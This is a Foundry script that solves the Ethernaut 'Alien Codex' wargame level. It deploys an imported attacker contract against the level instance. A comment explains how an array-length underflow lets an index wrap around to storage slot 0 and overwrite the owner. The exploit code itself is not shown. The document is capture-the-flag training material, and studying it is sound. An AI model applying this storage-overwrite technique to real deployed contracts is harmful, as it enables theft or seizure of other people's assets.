// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/19-AlienCodexAttacker.sol";

contract AlienCodexSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x0BC04aa6aaC163A6B3667636D798FA053D43BD11;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        /**
         * Never allow modification of the array length of a dynamic array as they 
         * can overwrite the whole contract's storage using overflows and underflows.
         * //////////////////////////////////////////////////////////////////////////
         *        Slot        Data
         *   ------------------------------
         *   0             owner address, contact bool
         *   1             codex.length
         *       .
         *       .
         *       .
         *   p             codex[0]
         *   p + 1         codex[1]
         *       .
         *       .
         *   2^256 - 2     codex[2^256 - 2 - p]
         *   2^256 - 1     codex[2^256 - 1 - p]
         *   0             codex[2^256 - p]  (overflow!)
         *
         * Form above table it can be seen that slot 0 in storage corresponds to index, 
         * i = 2^256 - p or 2^256 - keccak256(1) of codex!
         * //////////////////////////////////////////////////////////////////////////
         */
        AlienCodexAttacker alienCodexAttacker = new AlienCodexAttacker(challengeInstance);
        alienCodexAttacker.attack();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(19));
    }
}
